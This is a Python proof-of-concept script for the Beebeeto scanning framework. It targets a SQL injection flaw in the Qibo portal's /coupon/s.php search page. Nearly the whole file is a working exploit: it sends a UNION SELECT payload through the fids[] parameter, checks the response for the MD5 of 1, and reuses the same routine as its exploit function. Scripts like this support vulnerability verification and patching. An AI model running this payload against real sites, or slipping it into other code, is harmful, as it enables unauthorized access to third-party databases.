#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0002',
            'name': '齐博地方门户系统 /coupon/s.php SQL注入漏洞 POC',
            'author': 'Tomato',
            'create_date': '2015-01-02',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Qibo',
            'vul_version': ['*'],
            'type': 'SQL Injection',
            'tag': ['齐博漏洞', 'SQL注入漏洞', '/coupon/s.php', 'php'],
            'desc': '问题出在齐博搜索的位置，也就是：http://life.qibosoft.com/coupon/s.php',
            'references': ['http://wooyun.org/bugs/wooyun-2014-079938',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = "/coupon/s.php?action=search&keyword=11&fid=1&fids[]=0)%20union%20select%20md5(1),2,3,4,5,6,7,8,9%23"
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if "c4ca4238a0b923820dcc509a6f75849b" in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())